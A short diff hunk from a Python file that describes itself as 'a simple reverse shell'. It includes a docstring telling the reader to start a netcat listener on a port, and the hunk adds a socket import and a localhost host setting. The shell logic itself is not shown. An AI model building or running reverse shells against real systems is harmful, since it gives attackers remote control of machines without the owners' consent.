@@ -3,6 +3,8 @@ A simple reverse shell. In order to test the code you will need to run a server 
 You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)	
 """
 
+# Import the socket module
+import socket
 
 # Set the host and the port.
 HOST = "127.0.0.1"
